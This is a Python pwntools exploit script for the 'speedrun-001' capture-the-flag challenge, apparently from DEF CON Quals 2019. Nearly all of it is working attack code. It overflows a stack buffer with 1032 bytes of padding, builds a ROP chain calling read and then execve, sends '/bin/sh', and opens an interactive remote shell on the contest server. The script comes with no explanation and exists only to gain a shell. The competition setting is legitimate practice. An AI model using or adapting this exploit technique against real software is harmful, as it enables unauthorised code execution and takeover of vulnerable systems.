#!/usr/bin/env python2
import sys
sys.path.insert(0, "/mnt")

import speed
import re
import time
from pwn import *

context.binary = "speedrun-1/speedrun-001"

### Interact functions ###

##########################

if args.LOCAL:
    p = process(context.binary.path)
    raw_input('\n'.join([
        '',
        'attach {}'.format(p.pid),
        'continue',
        '',
        '[ENTER]'
        ]))

else:
    p = remote("speedrun-001.quals2019.oooverflow.io", 31337)

rop = ROP(context.binary)
#rop.call(0x400df8)
#rop.raw(p64(0x006bb2e0))
rop.call(0x004498a0, [0, 0x006bb2e0, 200])
rop.execve(0x006bb2e0, 0, 0)
print rop.dump()
p.sendline("A"*1032 + str(rop))
time.sleep(1)
p.send("/bin/sh\x00")
p.interactive()
